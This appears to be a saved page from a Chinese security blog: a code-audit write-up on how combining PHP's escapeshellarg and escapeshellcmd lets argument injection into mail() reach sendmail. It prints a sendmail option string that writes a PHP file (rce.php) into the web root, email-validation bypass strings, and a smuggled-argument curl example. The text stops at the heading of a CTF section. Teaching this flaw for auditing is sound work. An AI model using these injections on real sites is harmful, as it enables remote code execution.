@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="源码12345678910111213141516171819202122232425262728293031323334353637class Mailer &amp;#123;  private function sanitize($email) &amp;#123;    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &amp;#123;      return &amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 -- escapeshellarg与escapeshellcmd使用不当">
+<meta property="og:url" content="https://mayi077.github.io/2020/04/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="源码12345678910111213141516171819202122232425262728293031323334353637class Mailer &amp;#123;  private function sanitize($email) &amp;#123;    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &amp;#123;      return &amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-04-29T14:00:36.000Z">
+<meta property="article:modified_time" content="2020-04-29T14:05:48.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="escapeshellcmd">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://mayi077.github.io/2020/04/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>代码审计 -- escapeshellarg与escapeshellcmd使用不当 | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/04/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          代码审计 -- escapeshellarg与escapeshellcmd使用不当
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-04-29 22:00:36 / 修改时间：22:05:48" itemprop="dateCreated datePublished" datetime="2020-04-29T22:00:36+08:00">2020-04-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" itemprop="url" rel="index">
+                    <span itemprop="name">基础积累</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>28 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">class Mailer &#123;</span><br><span class="line">  private function sanitize($email) &#123;</span><br><span class="line">    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">      return &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return escapeshellarg($email);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function send($data) &#123;</span><br><span class="line">    if (!isset($data[&#39;to&#39;])) &#123;</span><br><span class="line">      $data[&#39;to&#39;] &#x3D; &#39;none@ripstech.com&#39;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      $data[&#39;to&#39;] &#x3D; $this-&gt;sanitize($data[&#39;to&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!isset($data[&#39;from&#39;])) &#123;</span><br><span class="line">      $data[&#39;from&#39;] &#x3D; &#39;none@ripstech.com&#39;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      $data[&#39;from&#39;] &#x3D; $this-&gt;sanitize($data[&#39;from&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!isset($data[&#39;subject&#39;])) &#123;</span><br><span class="line">      $data[&#39;subject&#39;] &#x3D; &#39;No Subject&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!isset($data[&#39;message&#39;])) &#123;</span><br><span class="line">      $data[&#39;message&#39;] &#x3D; &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mail($data[&#39;to&#39;], $data[&#39;subject&#39;], $data[&#39;message&#39;],</span><br><span class="line">      &#39;&#39;, &quot;-f&quot; . $data[&#39;from&#39;]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mailer &#x3D; new Mailer();</span><br><span class="line">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码大概就是一个发送邮件的功能。我们先来了解几个函数。</p>
+<h4 id="内置-mail-函数"><a href="#内置-mail-函数" class="headerlink" title="内置 mail 函数"></a>内置 mail 函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool mail (</span><br><span class="line">    string $to ,</span><br><span class="line">    string $subject ,</span><br><span class="line">    string $message [,</span><br><span class="line">    string $additional_headers [,</span><br><span class="line">    string $additional_parameters ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p><strong>其参数分别表示：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">to，指定邮件接收者，即接收人</span><br><span class="line">subject，邮件的标题</span><br><span class="line">message，邮件的正文内容</span><br><span class="line">additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</span><br><span class="line">additional_parameters，指定传递给发送程序sendmail的额外参数。</span><br></pre></td></tr></table></figure>
+<p>其中<strong>additional_parameters 额外参数中主要有：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-O option &#x3D; value  -O可用于重新配置sendmail选项</span><br><span class="line">QueueDirectory &#x3D; queuedir 选择队列消息</span><br><span class="line"></span><br><span class="line">-X logfile</span><br><span class="line">这个参数可以指定一个目录来记录发送邮件时的详细日志情况</span><br><span class="line"></span><br><span class="line">-f from email</span><br><span class="line">这个参数可以让我们指定我们发送邮件的邮箱地址</span><br></pre></td></tr></table></figure>
+
+<p><strong>例如如下代码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $to &#x3D; &#39;Alice@example.com&#39;;</span><br><span class="line">    $subject &#x3D; &#39;Hello Alice!&#39;;</span><br><span class="line">    $message &#x3D; &#39;&lt;?php phpinfo(); ?&gt;&#39;;</span><br><span class="line">    $headers &#x3D; &quot;CC:somebodyelse@example.com&quot;;</span><br><span class="line">    $options &#x3D; &#39;-OQueueDirectory&#x3D;&#x2F;tmp -X &#x2F;var&#x2F;www&#x2F;html&#x2F;rce.php&#39;;</span><br><span class="line">    mail($to, $subject, $headers, $options);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;其中 -O可用于重新配置sendmail选项 就是改了QueueDirectory选项</span><br><span class="line">&#x2F;&#x2F;然后 -x指定日志文件的位置。</span><br></pre></td></tr></table></figure>
+<p>这样我们就可以在网站根目录下创建一个<code>rce.php</code>内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">17220 &lt;&lt;&lt; To: Alice@example.com</span><br><span class="line">17220 &lt;&lt;&lt; Subject: Hello Alice!</span><br><span class="line">17220 &lt;&lt;&lt; X-PHP-Originating-Script: 0:test.php</span><br><span class="line">17220 &lt;&lt;&lt; CC: somebodyelse@example.com</span><br><span class="line">17220 &lt;&lt;&lt;</span><br><span class="line">17220 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt;</span><br><span class="line">17220 &lt;&lt;&lt; [EOF]</span><br></pre></td></tr></table></figure>
+
+<h4 id="filter-var-函数"><a href="#filter-var-函数" class="headerlink" title="filter_var 函数"></a>filter_var 函数</h4><p>我们以前也了解过它了，再来看看吧。</p>
+<blockquote>
+<p>filter_var ：使用特定的过滤器过滤一个变量   </p>
+<p><code>mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] )</code>  </p>
+<p>功能 ：根据第二个参数filter按照要求过滤一些想要过滤的东西。</p>
+</blockquote>
+<p>filter_var() 在使用 <strong>FILTER_VALIDATE_EMAIL</strong> 问题在于，我们在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 filter_val() 使其认为我们仍然在双引号中，这样我们就可以绕过检测。下面举个简单的例子，方便理解：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$email &#x3D; &#39;123 @example.c&#39;;</span><br><span class="line">if (filter_var($email, FILTER_VALIDATE_EMAIL))</span><br><span class="line">        echo &quot;Email: &quot;.$email.&quot; correct&quot;;</span><br><span class="line">else</span><br><span class="line">        echo &quot;email not correct&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;结果为 email not correct</span><br><span class="line">&lt;?php</span><br><span class="line">$email &#x3D; &#39;123\ @example.c&#39;;</span><br><span class="line">if (filter_var($email, FILTER_VALIDATE_EMAIL))</span><br><span class="line">        echo &quot;Email: &quot;.$email.&quot; correct&quot;;</span><br><span class="line">else</span><br><span class="line">        echo &quot;email not correct&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F; 结果为email not correct</span><br><span class="line">&#x2F;&#x2F;我们需要@前面的字符双引号引起来</span><br><span class="line">&lt;?php</span><br><span class="line">$email &#x3D; &#39;&quot;123\ &quot;@example.c&#39;;</span><br><span class="line">if (filter_var($email, FILTER_VALIDATE_EMAIL))</span><br><span class="line">        echo &quot;Email: &quot;.$email.&quot; correct&quot;;</span><br><span class="line">else</span><br><span class="line">        echo &quot;email not correct&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;Email: &quot;123\ &quot;@example.c correct</span><br><span class="line">&#x2F;&#x2F;我们再试试其它‘、“</span><br><span class="line">&lt;?php</span><br><span class="line">$email &#x3D; &#39;&quot;123\&quot;\&#39;&quot;@example.c&#39;;</span><br><span class="line">if (filter_var($email, FILTER_VALIDATE_EMAIL))</span><br><span class="line">        echo &quot;Email: &quot;.$email.&quot; correct&quot;;</span><br><span class="line">else</span><br><span class="line">        echo &quot;email not correct&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;Email: &quot;123\&quot;&#39;&quot;@example.c correct</span><br><span class="line">&#x2F;&#x2F;我们发现也是可以的，而且还被转义输出了</span><br><span class="line">&lt;?php</span><br><span class="line">$email &#x3D; &#39;\&#39;.&quot;123&quot;@example.c&#39;;</span><br><span class="line">if (filter_var($email, FILTER_VALIDATE_EMAIL))</span><br><span class="line">        echo &quot;Email: &quot;.$email.&quot; correct&quot;;</span><br><span class="line">else</span><br><span class="line">        echo &quot;email not correct&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;这样也是可以的Email: &#39;.&quot;123&quot;@example.c correct</span><br><span class="line">&lt;?php</span><br><span class="line">$email &#x3D; &#39;\&quot;.&quot;123&quot;@example.c&#39;;</span><br><span class="line">if (filter_var($email, FILTER_VALIDATE_EMAIL))</span><br><span class="line">        echo &quot;Email: &quot;.$email.&quot; correct&quot;;</span><br><span class="line">else</span><br><span class="line">        echo &quot;email not correct&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;但是这样就不可以了，从上一次的输出我们可以发现如果是&quot;会造成闭合错误</span><br></pre></td></tr></table></figure>
+
+<h4 id="escapeshellarg-函数"><a href="#escapeshellarg-函数" class="headerlink" title="escapeshellarg() 函数"></a>escapeshellarg() 函数</h4><blockquote>
+<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数  </p>
+<p>功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号) </p>
+</blockquote>
+<p>如以下测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &#39;123&#39;;</span><br><span class="line">$b&#x3D;escapeshellarg($a);</span><br><span class="line">echo &quot;old: &quot;.$a.&quot;\n&quot;;</span><br><span class="line">echo &quot;now: &quot;.$b;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;old: 123  now: &#39;123&#39; 发现它给2边加了单引号。</span><br><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;12&#39;3&quot;;</span><br><span class="line">$b&#x3D;escapeshellarg($a);</span><br><span class="line">echo &quot;old: &quot;.$a.&quot;\t\t&quot;;</span><br><span class="line">echo &quot;now: &quot;.$b;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;old: 12&#39;3	 now: &#39;12&#39;\&#39;&#39;3&#39; 发现单引号被注释，并已它为中介分为2边</span><br><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &#39;12&quot;3&#39;;</span><br><span class="line">$b&#x3D;escapeshellarg($a);</span><br><span class="line">echo &quot;old: &quot;.$a.&quot;\t\t&quot;;</span><br><span class="line">echo &quot;now: &quot;.$b;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;old: 12&quot;3	 now: &#39;12&quot;3&#39;  双引号并不会被反义</span><br><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &#39;12\&#125;[*3&#39;;</span><br><span class="line">$b&#x3D;escapeshellarg($a);</span><br><span class="line">echo &quot;old: &quot;.$a.&quot;\t\t&quot;;</span><br><span class="line">echo &quot;now: &quot;.$b;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;old: 12\&#125;[*3	now: &#39;12\&#125;[*3&#39;  似乎它只在意单引号</span><br></pre></td></tr></table></figure>
+
+<h4 id="escapeshellcmd-函数"><a href="#escapeshellcmd-函数" class="headerlink" title="escapeshellcmd() 函数"></a>escapeshellcmd() 函数</h4><p>&emsp;<strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行<strong>转义</strong>。 </p>
+<p>&emsp;反斜杠会在以下字符之前插入： #&amp;;`|<em>?~&lt;&gt;^()[]{}$, x0A 和 xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 都会被空格代替。（译注：实际测试发现在 Windows 平台是前缀 ^ 来转义的。）<br>*</em>测试：**</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &#39;12&quot;3&#39;;</span><br><span class="line">$b&#x3D;escapeshellcmd($a);</span><br><span class="line">echo &quot;old: &quot;.$a.&quot;\t\t&quot;;</span><br><span class="line">echo &quot;now: &quot;.$b;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;old: 12&quot;3	 now: 12\&quot;3  就是把可以字符注释掉</span><br><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &#39;12&quot;3&quot;&#39;;</span><br><span class="line">$b&#x3D;escapeshellcmd($a);</span><br><span class="line">echo &quot;old: &quot;.$a.&quot;\t\t&quot;;</span><br><span class="line">echo &quot;now: &quot;.$b;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;old: 12&quot;3&quot;  now: 12&quot;3&quot; 注意 &#39; 和 &quot; 仅在不配对儿的时候被转义</span><br><span class="line">&lt;?php</span><br><span class="line">$a &#x3D;&quot;&#39;123&#39;&quot;;</span><br><span class="line">$b&#x3D;escapeshellcmd($a);</span><br><span class="line">echo &quot;old: &quot;.$a.&quot;\t\t&quot;;</span><br><span class="line">echo &quot;now: &quot;.$b;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;old: &#39;123&#39;  now: &#39;123&#39; 验证了上面所说的结论。</span><br></pre></td></tr></table></figure>
+
+<h4 id="再来看题目了"><a href="#再来看题目了" class="headerlink" title="再来看题目了"></a>再来看题目了</h4><ol>
+<li>题目使用了先是使用了filter_var来过滤，我们已给出方案。</li>
+<li>随后会进入到 <code>escapeshellarg</code> 我们从上面基本了解了其用途和方法，但未知其绕过方法。</li>
+<li>PHP的 mail() 函数在底层实现中，调用了 escapeshellcmd() 函数，对用户输入的邮箱地址进行检测，导致即使存在特殊符号，也会被 escapeshellcmd() 函数处理转义。</li>
+<li>死活后面2个无法绕过，但其实他们2个一起用就会出现漏洞。</li>
+<li>测试如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $param&#x3D;&quot;127.0.0.1&#39; -v -d a&#x3D;1&quot;;</span><br><span class="line">    $a&#x3D;escapeshellarg($param);</span><br><span class="line">    $b&#x3D;escapeshellcmd($a);</span><br><span class="line">    $cmd&#x3D;&quot;curl &quot;.$b;</span><br><span class="line">    system($cmd);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;*</span><br><span class="line">1. 传入的参数为 127.0.0.1&#39; -v -d a&#x3D;1</span><br><span class="line">2. 在escapeshellarg先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</span><br><span class="line"> &#39;127.0.0.1&#39;\&#39;&#39; -v -d a&#x3D;1&#39;</span><br><span class="line">3. 接着 escapeshellcmd 函数对第二步处理后字符串中的 \ 以及 a&#x3D;1&#39; 中的单引号进行转义处理，结果如下所示： </span><br><span class="line">&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;</span><br><span class="line">4. 由于第三步处理之后的payload中的 \\ 被解释成了 \ 而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分。</span><br><span class="line">5. 最后相当构造为：curl 127.0.0.1\ -v -d a&#x3D;1&#39;即向 127.0.0.1\ 发起请求，POST 数据为 a&#x3D;1&#39; 。</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h3 id="CTF-题目"><a href="#CTF-题目" class="headerlink" title="CTF 题目"></a>CTF 题目</h3><p>index.php</p>
